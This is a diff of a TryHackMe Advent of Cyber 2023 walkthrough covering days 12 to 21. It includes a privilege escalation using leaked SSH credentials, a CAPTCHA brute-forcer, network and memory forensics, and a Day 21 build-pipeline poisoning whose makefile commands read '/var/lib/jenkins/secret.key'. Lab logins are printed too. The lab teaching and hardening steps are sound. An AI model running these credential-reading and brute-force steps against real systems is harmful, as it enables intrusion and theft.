-![Advent of Cyber 2023 - Backup.sh](/images/aoc2023d12_backup_sh.png)
+![Advent of Cyber 2023 - Backup.sh](tryhackme/images/aoc2023d12_backup_sh.png)
 
 Looking at the script, we see that it performs a backup of the Jenkins data and compresses it into a `tar.gz` archive before transferring it via SSH using the `tracy` user's credentials.
 
 This means that we can authenticate as `tracy` via SSH:
 
-![Advent of Cyber 2023 Day 12 - Tracy SSH](/images/aoc2023d12_tracy_ssh.png)
+![Advent of Cyber 2023 Day 12 - Tracy SSH](tryhackme/images/aoc2023d12_tracy_ssh.png)
 
 From here, we can run `sudo -l` to check what commands the `tracy` user can run using `sudo`:
 
-![Advent of Cyber 2023 Day 12 - Sudo -l](/images/aoc2023d12_sudo_l.png)
+![Advent of Cyber 2023 Day 12 - Sudo -l](tryhackme/images/aoc2023d12_sudo_l.png)
 
 We can see that the user can perform any command, allowing us to run `sudo su` and escalate our privileges to `root` and read the `/root/flag.txt` file:
 
@@ -678,9 +678,9 @@ We can see that the user can perform any command, allowing us to run `sudo su` a
 $ sudo su
 ```
 
-![Advent of Cyber 2023 Day 12 - sudo su](/images/aoc2023d12_sudo_su.png)
+![Advent of Cyber 2023 Day 12 - sudo su](tryhackme/images/aoc2023d12_sudo_su.png)
 
-![Advent of Cyber 2023 Day 12 - Flag](/images/aoc2023d12_flag.png)
+![Advent of Cyber 2023 Day 12 - Flag](tryhackme/images/aoc2023d12_flag.png)
 
 Now that we have successfully compromised this system, lets implement some fixes to prevent this from happening in future. Firstly, we can remove `tracy` from the `sudo` group, preventing them from using `sudo`:
 
@@ -692,15 +692,15 @@ $ sudo deluser tracy sudo
 $ sudo -l -U tracy
 ```
 
-![Advent of Cyber 2023 Day 12 - Remove Tracy Sudo](/images/aoc2023d12_remove_tracy_sudo.png)
+![Advent of Cyber 2023 Day 12 - Remove Tracy Sudo](tryhackme/images/aoc2023d12_remove_tracy_sudo.png)
 
 Authenticating as `tracy` and attempting to run `sudo -l`, we get the following error:
 
-![Advent of Cyber 2023 Day 12 - sudo -l error](/images/aoc2023d12_sudo_l_error.png)
+![Advent of Cyber 2023 Day 12 - sudo -l error](tryhackme/images/aoc2023d12_sudo_l_error.png)
 
 Now, lets harden the SSH configuration on the host. Editing the `/etc/ssh/sshd_config` file, we can reconfigure it so that password authentication is disabled - simply removing the `#` and changing `yes` to `no` on the line that reads `#PasswordAuthentication yes`:
 
-![Advent of Cyber 2023 Day 12 - Disable Password Authentication](/images/aoc2023d12_disable_password_auth.png)
+![Advent of Cyber 2023 Day 12 - Disable Password Authentication](tryhackme/images/aoc2023d12_disable_password_auth.png)
 
 Similarly, we can change the line that says `Include /etc/ssh/sshd_config/*.conf` and add a `#` at the start. Finally, we can save the file and restart the SSH service:
 
@@ -710,15 +710,15 @@ $ sudo systemctl restart ssh
 
 Now, when attempting to authenticate as `tracy` using the password, we are denied due to the lack of key-based authentication:
 
-![Advent of Cyber 2023 Day 12 - SSH Error](/images/aoc2023d12_ssh_error.png)
+![Advent of Cyber 2023 Day 12 - SSH Error](tryhackme/images/aoc2023d12_ssh_error.png)
 
 Finally, let's secure our Jenkins instance. To do this, we can navigate to `/var/lib/jenkins`. We see that there are two config files, `config.xml` and `config.xml.bak`:
 
-![Advent of Cyber 2023 Day 12 - /var/lib/jenkins](/images/aoc2023d12_var_lib_jenkins.png)
+![Advent of Cyber 2023 Day 12 - /var/lib/jenkins](tryhackme/images/aoc2023d12_var_lib_jenkins.png)
 
 Opening this file, we can see that attributes `authorizationStrategy` and `securityRealm` have been commented out - denoted by `<!--` and `-->` syntax:
 
-![Advent of Cyber 2023 Day 12 - Commented Out](/images/aoc2023d12_commented_out.png)
+![Advent of Cyber 2023 Day 12 - Commented Out](tryhackme/images/aoc2023d12_commented_out.png)
 
 Removing these comments, replacing `config.xml` with `config.xml.bak` and restarting Jenkins now results in the inner workings being inaccessible:
 
@@ -728,7 +728,7 @@ $ cp config.xml.bak config.xml
 $ sudo systemctl restart jenkins
 ```
 
-![Advent of Cyber 2023 Day 12 - Jenkins Sign In](/images/aoc2023d12_jenkins_sign_in.png)
+![Advent of Cyber 2023 Day 12 - Jenkins Sign In](tryhackme/images/aoc2023d12_jenkins_sign_in.png)
 
 ## Day 13 - To the Pots, Through the Walls
 
@@ -743,7 +743,7 @@ The team is looking to adopt the **Diamond Model**, an intrusion analysis framew
 - **Infrastructure**: the required systems and tools (physical and logical) that an adversary would deploy
 - **Capabilities**: the tactics, techniques, and procedures adopted by the threat actor (ref: [MITRE ATT&CK](https://attack.mitre.org/))
 
-![Advent of Cyber 2023 Day 13 - Diamond Model](/images/aoc2023d13_diamond_model.png)
+![Advent of Cyber 2023 Day 13 - Diamond Model](tryhackme/images/aoc2023d13_diamond_model.png)
 
 This model also stretches to the defensive side, particularly when looking at capabilities:
 
@@ -766,7 +766,7 @@ When we connect to our host, we see that the firewall is **inactive**:
 $ sudo ufw status
 ```
 
-![Advent of Cyber 2023 Day 13 - Firewall Disabled](/images/aoc2023d13_firewall_disabled.png)
+![Advent of Cyber 2023 Day 13 - Firewall Disabled](tryhackme/images/aoc2023d13_firewall_disabled.png)
 
 This means we don't have any rules to block or allow traffic. We can set a **default policy** to **allow** outbound/outgoing and **deny** inbound/incoming traffic, as follows:
 
@@ -778,7 +778,7 @@ $ sudo ufw default allow outgoing
 $ sudo ufw default deny incoming
 ```
 
-![Advent of Cyber 2023 Day 13 - Default Policies](/images/aoc2023d13_default_policies.png)
+![Advent of Cyber 2023 Day 13 - Default Policies](tryhackme/images/aoc2023d13_default_policies.png)
 
 On a more granular basis, we can add, modify, and delete rules for specific IP addresses, port numbers, services, or protocols. For example, if we want to allow inbound/incoming connections to port 22 (TCP SSH) over IPv4 and IPv6, we can run the following:
 
@@ -786,7 +786,7 @@ On a more granular basis, we can add, modify, and delete rules for specific IP a
 $ sudo ufw allow 22/tcp
 ```
 
-![Advent of Cyber 2023 Day 13 - Allow SSH](/images/aoc2023d13_allow_ssh.png)
+![Advent of Cyber 2023 Day 13 - Allow SSH](tryhackme/images/aoc2023d13_allow_ssh.png)
 
 Firewall rules can then become more complex, incorporating specific IP addresses, subnets, or network interfaces.
 
@@ -798,7 +798,7 @@ $ sudo ufw deny from 192.168.100.25
 $ sudo ufw deny in on eth0 from 192.168.100.26
 ```
 
-![Advent of Cyber 2023 Day 13 - Complex Rules](/images/aoc2023d13_complex_rules.png)
+![Advent of Cyber 2023 Day 13 - Complex Rules](tryhackme/images/aoc2023d13_complex_rules.png)
 
 Once we have added our rules, we can **enable** the firewall and check the rules we have set. If there are any issues or if rules are incorrectly configured, we can reset the firewall and rever it to its default state:
 
@@ -813,7 +813,7 @@ $ sudo ufw status verbose
 $ sudo ufw reset
 ```
 
-![Advent of Cyber 2023 Day 13 - Enable, Status, Reset](/images/aoc2023d13_enable_status_reset.png)
+![Advent of Cyber 2023 Day 13 - Enable, Status, Reset](tryhackme/images/aoc2023d13_enable_status_reset.png)
 
 Pivoting to the honeypot, there are two main types of note:
 
@@ -827,19 +827,19 @@ $ cd /home/vantwinkle/pentbox/pentbox-1.8
 $ sudo ./pentbox.rb
 ```
 
-![Advent of Cyber 2023 Day 13 - PenTBox Start](/images/aoc2023d13_pentbox_start.png)
+![Advent of Cyber 2023 Day 13 - PenTBox Start](tryhackme/images/aoc2023d13_pentbox_start.png)
 
 Selecting option 2, **Network tools**, and then the following **option 3**, **Honeypot**, we can choose our configuration option. We will choose **option 1**, **Fast Auto Configuration**:
 
-![Advent of Cyber 2023 Day 13 - Network Honeypot](/images/aoc2023d13_network_honeypot.png)
+![Advent of Cyber 2023 Day 13 - Network Honeypot](tryhackme/images/aoc2023d13_network_honeypot.png)
 
 We can attempt to connect to our host on the honeypot port for testing:
 
-![Advent of Cyber 2023 Day 13 - Intrusion Detected](/images/aoc2023d13_intrusion_detected.png)
+![Advent of Cyber 2023 Day 13 - Intrusion Detected](tryhackme/images/aoc2023d13_intrusion_detected.png)
 
 VanTwinkle has learned about firewalls and honeypots and provided us a bash script with a list of rules. We can run this as follows:
 
-![Advent of Cyber 2023 Day 13 - VanTwinkle Script](/images/aoc2023d13_vantwinkle_script.png)
+![Advent of Cyber 2023 Day 13 - VanTwinkle Script](tryhackme/images/aoc2023d13_vantwinkle_script.png)
 
 Running a status check on the firewall, we see that only ports 80 (HTTP) and 22 (SSH) are allowed on both IPv4 and IPv6, with ports 21, 8088 and 8089 denied:
 
@@ -847,7 +847,7 @@ Running a status check on the firewall, we see that only ports 80 (HTTP) and 22 
 $ sudo ufw status verbose
 ```
 
-![Advent of Cyber 2023 Day 13 - Firewall Status](/images/aoc2023d13_firewall_status.png)
+![Advent of Cyber 2023 Day 13 - Firewall Status](tryhackme/images/aoc2023d13_firewall_status.png)
 
 Allowing port 8090 will result in the website being publicly-accessible which allows us to retrieve the flag:
 
@@ -859,9 +859,9 @@ $ sudo ufw allow 8090/tcp
 $ sudo ufw status verbose
 ```
 
-![Advent of Cyber 2023 Day 13 - Updated Rule](/images/aoc2023d13_updated_rule.png)
+![Advent of Cyber 2023 Day 13 - Updated Rule](tryhackme/images/aoc2023d13_updated_rule.png)
 
-![Advent of Cyber 2023 Day 13 - Flag](/images/aoc2023d13_flag.png)
+![Advent of Cyber 2023 Day 13 - Flag](tryhackme/images/aoc2023d13_flag.png)
 
 ## Day 14 - The Little Machine That Wanted To Learn
 
@@ -878,7 +878,7 @@ In the context of neural networks, there are two main styles in which they are t
 - **Supervised learning**: uses a labelled dataset where the correct answers are known. The network gives an answer and we provide feedback on how accurate it was to the correct answer
 - **Unsupervised learning**: Looks for interesting aspects of the data itself rather than being told what features to look for and is able to abstract a far greater number of dimensions and see patterns much better than humans
 
-![Advent of Cyber 2023 Day 14 - Neural Network Structure](/images/aoc2023d14_neural_net_structure.png)
+![Advent of Cyber 2023 Day 14 - Neural Network Structure](tryhackme/images/aoc2023d14_neural_net_structure.png)
 
 As above, the neural network has three main layers:
 
@@ -975,11 +975,11 @@ Running this in the terminal:
 $ python3 detector.py
 ```
 
-![Advent of Cyber 2023 Day 14 - Detector](/images/aoc2023d14_detector.png)
+![Advent of Cyber 2023 Day 14 - Detector](tryhackme/images/aoc2023d14_detector.png)
 
 We can see our accuracy is `91.92%` which is good enough to be uploaded to `http://websiteforpredictions.thm:8000/`:
 
-![Advent of Cyber 2023 Day 14 - Flag](/images/aoc2023d14_flag.png)
+![Advent of Cyber 2023 Day 14 - Flag](tryhackme/images/aoc2023d14_flag.png)
 
 We now have a working neural network which allows us to remove all of the defective toys with an accuracy of up to `91.48%`!
 
@@ -989,7 +989,7 @@ Over the merger period, the Best Festival Company has been receiving a large num
 
 For this lab, we will be using Jupyter Notebooks, an environment which allows you to write and execute code in real-time, thus making it ideal for data analysis. We will use this to build a ML pipeline, a series of steps which involves building and deploying an ML model:
 
-![Advent of Cyber 2023 Day 15 - ML Model](/images/aoc2023d15_ml_pipeline.png)
+![Advent of Cyber 2023 Day 15 - ML Model](tryhackme/images/aoc2023d15_ml_pipeline.png)
 
 The first step is to import the required libraries, specifically Numpy and Pandas:
 
@@ -1076,7 +1076,7 @@ results_df = pd.DataFram({'Messages': test_data['Messages'], 'Prediction': new_p
 print(results_df)
 ```
 
-![Advent of Cyber 2023 Day 15 - New Spam](/images/aoc2023d15_new_spam.png)
+![Advent of Cyber 2023 Day 15 - New Spam](tryhackme/images/aoc2023d15_new_spam.png)
 
 From the above, we see **3 spam emails** have been identified in the test dataset.
 
@@ -1088,7 +1088,7 @@ for s in spam_emails:
     print(f'{s}\n')
 ```
 
-![Advent of Cyber 2023 Day 15 - Flag](/images/aoc2023d15_flag.png)
+![Advent of Cyber 2023 Day 15 - Flag](tryhackme/images/aoc2023d15_flag.png)
 
 ## Day 16 - Can't CAPTCHA this Machine!
 
@@ -1104,13 +1104,13 @@ To do this, we will use **Convolutional Neural Networks (CNN)** which are able t
 
 To perceive the characters in the CAPTCHA, the system looks at the 2D array of pixels and the values they hold, either in RGB (three numbers between 0-255) or greyscale (single number 0-255):
 
-![Advent of Cyber 2023 Day 16 - CAPTCHA Pixels](/images/aoc2023d16_captcha_pixels.png)
+![Advent of Cyber 2023 Day 16 - CAPTCHA Pixels](tryhackme/images/aoc2023d16_captcha_pixels.png)
 
 For feature extraction, the CNN first reduces the size of the input through **convolution** which summarises the image by crafting a smaller 2D array of pixel values. Doing this reduces the size of the network while still maintaining high accuracy in the model.
 
 The next step is **pooling** which further summarises the image using statistical methods. For each kernel within the image, a summary is generated using max or average pooling which calculates the max or average value of the pixels, respectively.
 
-![Advent of Cyber 2023 - Day 16 - Pooling](/images/aoc2023d16_pooling.png)
+![Advent of Cyber 2023 - Day 16 - Pooling](tryhackme/images/aoc2023d16_pooling.png)
 
 Now that the features have been extracted, the next step is to build the network where each node connects to all nodes in the next layre.
 
@@ -1130,11 +1130,11 @@ $ docker exec -it <CONTAINER_ID> /bin/bash
 $ cd /ocr/
 ```
 
-![Advent of Cyber 2023 Day 16 - Docker Connect](/images/aoc2023d16_docker_connect.png)
+![Advent of Cyber 2023 Day 16 - Docker Connect](tryhackme/images/aoc2023d16_docker_connect.png)
 
 In order to gather the data to train our CNN, we can look at the authentication portal at `http://hqadmin.thm:8000/` and capture the generated CAPTCHAs:
 
-![Advent of Cyber 2023 Day 16 - Auth Portal](/images/aoc2023d16_auth_portal.png)
+![Advent of Cyber 2023 Day 16 - Auth Portal](tryhackme/images/aoc2023d16_auth_portal.png)
 
 We can get the raw image via cURL which produces a Base64-encoded version of the CAPTCHA. We can write a script to extract the image but this has already been done for us, as we are provided with a dataset in `raw_data/dataset`.
 
@@ -1176,11 +1176,11 @@ With this, we can run the `bruteforcer.py` script and retrieve McSkidy's passwor
 $ python3 ~/Desktop/bruteforcer/bruteforcer.py
 ```
 
-![Advent of Cyber 2023 Day 16 - McSkidy's Password](/images/aoc2023d16_mcskidy_password.png)
+![Advent of Cyber 2023 Day 16 - McSkidy's Password](tryhackme/images/aoc2023d16_mcskidy_password.png)
 
 Logging into the admin portal, we retrieve the flag:
 
-![Advent of Cyber 2023 Day 16 - Flag](/images/aoc2023d16_flag.png)
+![Advent of Cyber 2023 Day 16 - Flag](tryhackme/images/aoc2023d16_flag.png)
 
 ## Day 17 - I Tawt I Taw A C2 Tat!
 
@@ -1188,7 +1188,7 @@ Santa's Security Operations Centre (SSOC) needs to see the big picture to identi
 
 They provided us with a VM running SiLK (Systsem for Internet Knowledge) toolkit version `3.19.1`. We are also provided a binary flow `suspicious-flows.silk` which we can summarise using `rwfileinfo`:
 
-![Advent of Cyber 2023 Day 17 - SiLK rwfileinfo](/images/aoc2023d17_silk_rwfileinfo.png)
+![Advent of Cyber 2023 Day 17 - SiLK rwfileinfo](tryhackme/images/aoc2023d17_silk_rwfileinfo.png)
 
 There are numerous utilities bundled with SiLK. `rwcut` reads the binary flow records and prints the selected fields in text format:
 
@@ -1264,7 +1264,7 @@ With all of this information, we can now hunt for the anomalies in the network. 
 $ rwstats suspicious-flows.silk --fields=sIP --values=bytes --count=10 --top
 ```
 
-![Advent of Cyber 2023 Day 17 - Top IPs](/images/aoc2023d17_top_ips.png)
+![Advent of Cyber 2023 Day 17 - Top IPs](tryhackme/images/aoc2023d17_top_ips.png)
 
 We can see that `175.219.238.243`, `175.175.173.221`, and `175.215.235.223` make up the most of the traffic in the network. We can look at the top communication pairs to see if any of them are communicating with each other:
 
@@ -1272,7 +1272,7 @@ We can see that `175.219.238.243`, `175.175.173.221`, and `175.215.235.223` make
 $ rwstats suspicious-flows.silk --fields=sIP,dIP --values=records,bytes,packets --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Communication Pairs](/images/aoc2023d17_communication_pairs.png)
+![Advent of Cyber 2023 Day 17 - Communication Pairs](tryhackme/images/aoc2023d17_communication_pairs.png)
 
 This confirms these IPs are creating the majority of the noise on the network. From earlier, we found that DNS makes up a large proportion of the traffic, so we can pivot on this to ascertain who is creating this traffic:
 
@@ -1280,7 +1280,7 @@ This confirms these IPs are creating the majority of the noise on the network. F
 $ rwfilter suspicious-flows.silk --aport=53 --pass=stdout | rwstats --fields=sIP,dIP --values=records,bytes,packets --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - DNS Summary](/images/aoc2023d17_dns_summary.png)
+![Advent of Cyber 2023 Day 17 - DNS Summary](tryhackme/images/aoc2023d17_dns_summary.png)
 
 We can then look at the frequency pf this communication, as follows:
 
@@ -1288,7 +1288,7 @@ We can then look at the frequency pf this communication, as follows:
 $ rwfilter suspicious-flows.silk --sadddress=175.175.173.221 --dport=53 --pass=stdout | rwcut --fields=sIP,dIP,stime | head -10
 ```
 
-![Advent of Cyber 2023 Day 17 - DNS Frequency](/images/aoc2023d17_dns_frequency.png)
+![Advent of Cyber 2023 Day 17 - DNS Frequency](tryhackme/images/aoc2023d17_dns_frequency.png)
 
 We can see over 10 DNS requests occur in less than a second, confirming this as suspicious traffic. Filtering on the other `sIP` does not show any DNS requests.
 
@@ -1298,7 +1298,7 @@ Before concluding the DNS analysis, we can check if any hosts have interacted wi
 $ rwfilter suspicious-flows.silk --any-address=175.175.173.221 --pass=stdout | rwcut --fields=sIP,dIP,stime --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Interacting Hosts](/images/aoc2023d17_interacting_hosts.png)
+![Advent of Cyber 2023 Day 17 - Interacting Hosts](tryhackme/images/aoc2023d17_interacting_hosts.png)
 
 From the above, we see `205.213.108.99` has interacted with this suspicious host, so we can pivot to this new connection pair to summarise the ports which we see it interact:
 
@@ -1306,7 +1306,7 @@ From the above, we see `205.213.108.99` has interacted with this suspicious host
 $ rwfilter suspicious-flows.silk --any-address=205.213.108.99 --pass=stdout | rwstats --fields=sIP,sPort,dIP,dPort --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Other IP Summary](/images/aoc2023d17_other_ip_summary.png)
+![Advent of Cyber 2023 Day 17 - Other IP Summary](tryhackme/images/aoc2023d17_other_ip_summary.png)
 
 We see four records on UDP port 123 which is used by the NTP service. As the volume of this is very low, we can assess this as legitimate traffic.
 
@@ -1316,7 +1316,7 @@ Continuing with our analysis, we can analyse the port 80 traffic which was highl
 $ rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Port 80 Connection Pairs](/images/aoc2023d17_port_80_pairs.png)
+![Advent of Cyber 2023 Day 17 - Port 80 Connection Pairs](tryhackme/images/aoc2023d17_port_80_pairs.png)
 
 Revealing the IP that created the noise by focusing on the destination port:
 
@@ -1324,7 +1324,7 @@ Revealing the IP that created the noise by focusing on the destination port:
 $ rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP,dPort --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Port 80 dPort](/images/aoc2023d17_port_80_dport.png)
+![Advent of Cyber 2023 Day 17 - Port 80 dPort](tryhackme/images/aoc2023d17_port_80_dport.png)
 
 From this, we can reveal that IP `175[.]215[.]236[.]223` has generated this traffic. Let's view the frequency and flags of the requests being sent:
 
@@ -1332,7 +1332,7 @@ From this, we can reveal that IP `175[.]215[.]236[.]223` has generated this traf
 $ rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwcut --fields=sIP,dIP,dPort,flag,stime | head
 ```
 
-![Advent of Cyber 2023 Day 17 - Port 80 Frequency](/images/aoc2023d17_port_80_frequency.png)
+![Advent of Cyber 2023 Day 17 - Port 80 Frequency](tryhackme/images/aoc2023d17_port_80_frequency.png)
 
 From the `flags`, we can see that a number of SYN packets were sent in less than a second. Viewing these packets sent by this host:
 
@@ -1340,7 +1340,7 @@ From the `flags`, we can see that a number of SYN packets were sent in less than
 $ rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - No ACK](/images/aoc2023d17_no_ack.png)
+![Advent of Cyber 2023 Day 17 - No ACK](tryhackme/images/aoc2023d17_no_ack.png)
 
 From the above, we see that no ACK packets were sent by this host, indicating this is a potential DoS attack. To confirm, we can look at the answers provided by the destination host:
 
@@ -1348,7 +1348,7 @@ From the above, we see that no ACK packets were sent by this host, indicating th
 $ rwfilter suspicious-flows.silk --saddress=175.215.235.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - SYN ACK](/images/aoc2023d17_syn_ack.png)
+![Advent of Cyber 2023 Day 17 - SYN ACK](tryhackme/images/aoc2023d17_syn_ack.png)
 
 We see that the destination address sends SYN-ACK packets to complete the three-way handshake. However, as the source address only sends SYN packets (no ACK), this confirms this is a DoS attack as the three-way handshake is incomplete.
 
@@ -1358,7 +1358,7 @@ For due diligence, we can check for any interactions from this host, as follows:
 $ rwfilter suspicious-flows.silk --any-address=175.236.223 --pass=stdout | rwstats --fields=sIP,dIP --count=10
 ```
 
-![Advent of Cyber 2023 Day 17 - Due Diligence](/images/aoc2023d17_due_diligence.png)
+![Advent of Cyber 2023 Day 17 - Due Diligence](tryhackme/images/aoc2023d17_due_diligence.png)
 
 Thankfully, there are no additional interactions, so we can conclude our investigation.
 
@@ -1368,7 +1368,7 @@ During the investigation of an insider threat, it was determined that a producti
 
 Running the `top` command, we can see the dynamic processes running on the system. Most notably, we see that process with PID `645` and command `a` is using `100.0%` of the CPU:
 
-![Advent of Cyber 2023 Day 18 - top](/images/aoc2023d18_top.png)
+![Advent of Cyber 2023 Day 18 - top](tryhackme/images/aoc2023d18_top.png)
 
 However, killing this process with `sudo kill <PID>` will not work as the process will spawn again.
 
@@ -1378,7 +1378,7 @@ Viewing the crontabs, we see there are two processes which involve a VNC server:
 $ crontab -l
 ```
 
-![Advent of Cyber 2023 Day 18 - User Crontab](/images/aoc2023d18_user_crontab.png)
+![Advent of Cyber 2023 Day 18 - User Crontab](tryhackme/images/aoc2023d18_user_crontab.png)
 
 Given the user running the processes is `root`, we can also check the `root` user's cronjobs since every user has their own, but this does not return any valuable information.
 
@@ -1393,7 +1393,7 @@ As the service automatically restarts when it is killed, we can use `systemctl` 
 $ systemctl list-unit-files | grep enabled
 ```
 
-![Advent of Cyber 2023 Day 18 - Enabled Services](/images/aoc2023d18_enabled_services.png)
+![Advent of Cyber 2023 Day 18 - Enabled Services](tryhackme/images/aoc2023d18_enabled_services.png)
 
 We can check the status for this service:
 
@@ -1401,7 +1401,7 @@ We can check the status for this service:
 $ systemctl status a-unkillable.service
 ```
 
-![Advent of Cyber 2023 Day 18 - Status](/images/aoc2023d18_status.png)
+![Advent of Cyber 2023 Day 18 - Status](tryhackme/images/aoc2023d18_status.png)
 
 We can now confirm the rogue service is running from `/etc/systemd/system/a service` and the process is `/etc/systemd/system/a`. We can permanently delete it by deleting the files:
 
@@ -1439,7 +1439,7 @@ $ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/v
 $ vol.py --info | grep Ubuntu
 ```
 
-![Advent of Cyber 2023 Day 19 - Copy Profile](/images/aoc2023d19_copy_profile.png)
+![Advent of Cyber 2023 Day 19 - Copy Profile](tryhackme/images/aoc2023d19_copy_profile.png)
 
 We can use the `linux_bash` plugin to look at the `history` file to see which commands were executed by the malicious actor:
 
@@ -1447,7 +1447,7 @@ We can use the `linux_bash` plugin to look at the `history` file to see which co
 $ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
 ```
 
-![Advent of Cyber 2023 Day 19 - Linux Bash](/images/aoc2023d19_linux_bash.png)
+![Advent of Cyber 2023 Day 19 - Linux Bash](tryhackme/images/aoc2023d19_linux_bash.png)
 
 From the above, we can see that the `msql` command was used by the elf analyst but `cat /home/elfie/.bash_history` was not, which means the threat actor has likely used the exposed credentials to access the database.
 
@@ -1459,7 +1459,7 @@ We can look at the  running processes to identify any anomalies in relation to t
 $ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
 ```
 
-![Advent of Cyber 2023 Day 19 - Running Processes](/images/aoc2023d19_running_processes.png)
+![Advent of Cyber 2023 Day 19 - Running Processes](tryhackme/images/aoc2023d19_running_processes.png)
 
 We can see the `miner` process is running under PID `10280`. Based on its name, we can hypothesise this is a cryptocurrency miner. The above output also indicates the `mysqlserver` process is suspicious, since the real process for MySQL is `mysqld`. Given the PPID is different from the miner process, this did not spawn from `miner` directly.
 
@@ -1470,7 +1470,7 @@ $ mkdir extracted
 $ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p <PID>
 ```
 
-![Advent of Cyber 2023 Day 19 - linux procdump](/images/aoc2023d19_linux_procdump.png)
+![Advent of Cyber 2023 Day 19 - linux procdump](tryhackme/images/aoc2023d19_linux_procdump.png)
 
 From here, we can conduct basic file analysis to extract some indicators of compromise (IoCs). We first compute the MD5 hash of each file using `md5sum`:
 
@@ -1478,7 +1478,7 @@ From here, we can conduct basic file analysis to extract some indicators of comp
 $ md5sum <FILENAME>
 ```
 
-![Advent of Cyber 2023 Day 19 - md5sum](/images/aoc2023d19_md5sum.png)
+![Advent of Cyber 2023 Day 19 - md5sum](tryhackme/images/aoc2023d19_md5sum.png)
 
 Running `strings` against the extracted miner binary reveals a suspicious URL:
 
@@ -1496,7 +1496,7 @@ As part of our analysis, we want to look at cronjobs for any persistence mechani
 $ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron
 ```
 
-![Advent of Cyber 2023 Day 19 - Cronjobs](/images/aoc2023d19_cronjobs.png)
+![Advent of Cyber 2023 Day 19 - Cronjobs](tryhackme/images/aoc2023d19_cronjobs.png)
 
 We discover a `/var/spool/cron/crontabs/elfie` cronjob which we cam then extract via `linux_find_file` supplying its inode value `0xffff9ce9b78280e8`:
 
@@ -1506,7 +1506,7 @@ $ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux
 
 Running strings on this file reveals the malicious persistent cronjob set up by the threat actor:
 
-![Advent of Cyber 2023 Day 19 - elfie](/images/aoc2023d19_elfie.png)
+![Advent of Cyber 2023 Day 19 - elfie](tryhackme/images/aoc2023d19_elfie.png)
 
 ## Day 20 - Advent of Frostlings
 
@@ -1514,11 +1514,11 @@ During the merger process, someone has tampered with the source control system a
 
 We can access the GitLab server with credentials `DelfSecOps:TryHackMe!` and open **AoC DevSecOps / Advent-Calendar-BFC** to view the repository. It comprises a `public/` directory, a `.gitlab-ci.yml` which defines the operation of the CI/CD pipeline:
 
-![Advent of Cyber 2023 Day 20 - Repository](/images/aoc2023d20_repo.png)
+![Advent of Cyber 2023 Day 20 - Repository](tryhackme/images/aoc2023d20_repo.png)
 
 Looking specifically at the `.gitlab-ci.yml`, we can see the CI/CD configuration:
 
-![Advent of Cyber 2023 Day 20 - .gitlab-ci.yml](/images/aoc2023d20_gitlab_ci.png)
+![Advent of Cyber 2023 Day 20 - .gitlab-ci.yml](tryhackme/images/aoc2023d20_gitlab_ci.png)
 
 To summarise:
 
@@ -1533,17 +1533,17 @@ Detective Frost-eau notes that the Advent Calendar has been stuck in testing for
 
 We can start by looking at the merge requests/attempts and see one was opened and merged two weeks ago by Frostlino (@BadSecOps):
 
-![Advent of Cyber 2023 Day 20 - Merge Request](/images/aoc2023d20_merge_request.png)
+![Advent of Cyber 2023 Day 20 - Merge Request](tryhackme/images/aoc2023d20_merge_request.png)
 
 Looking closely at the activity, some code was altered and Delf Lead approved the changes. Looking at **CI/CD -> Jobs**, we can view the jobs being executed. It seems that the testing environment has been affecting the website in the production environment.
 
 We can confirm this by going to the website on `MACHINE IP:9081` and see it is defaced with a **Frostlings Rule** message.
 
-![Advent of Cyber 2023 Day 20 - Defaced Website](/images/aoc2023d20_defaced_website.png)
+![Advent of Cyber 2023 Day 20 - Defaced Website](tryhackme/images/aoc2023d20_defaced_website.png)
 
 Pivoting to the last pipeline that was ran, we see some potentially suspicious behaviour:
 
-![Advent of Cyber 2023 Day 20 - Last Pipeline](/images/aoc2023d20_last_pipeline.png)
+![Advent of Cyber 2023 Day 20 - Last Pipeline](tryhackme/images/aoc2023d20_last_pipeline.png)
 
 - User information being printed with `whoami` and `pwd`
 - Detailed directory contents being printed with `ls -la` and `ls -la ./public/`
@@ -1556,7 +1556,7 @@ Looking at the previous commits, we see multiple commits from Frostlino which ma
 
 Navigating to this commit, we can take the code within `.gitlab-ci.yml` and copy its contents to the current `main` branch and click **commit**:
 
-![Advent of Cyber 2023 Day 20 - Edit Config](/images/aoc2023d20_edit_config.png)
+![Advent of Cyber 2023 Day 20 - Edit Config](tryhackme/images/aoc2023d20_edit_config.png)
 
 ## Day 21 - Yule be Poisoned: A Pipeline of Insecure Code!
 
@@ -1608,7 +1608,7 @@ $ git push
 
 However, when we attempt to push with our `guest` user credentials, we see that `main` is protected. Unfortunately, we cannot create a new branch as this is write-protected too.
 
-![Advent of Cyber 2023 Day 20 - Write Protected](/images/aoc2023d20_write_protected.png)
+![Advent of Cyber 2023 Day 20 - Write Protected](tryhackme/images/aoc2023d20_write_protected.png)
 
 Looking back at the Jenkinsfile, we see that it uses `make` which can be used to define a set of rules to execute steps, such as commands. The makefile is defined within the `gift-wrapper` repo which means it may have different protections than the pipeline repository, allowing an attacker to add malicious commands to it.
 
@@ -1646,7 +1646,7 @@ cat /var/lib/jenkins/secret.key
 
 Attempting to push the changes, we see that our commit is successful. We can then run this build within Jenkins and retrieve the information we need for the challenge:
 
-![Advent of Cyber 2023 Day 21 - Build Flag](/images/aoc2023d21_build_flag.png)
+![Advent of Cyber 2023 Day 21 - Build Flag](tryhackme/images/aoc2023d21_build_flag.png)
 
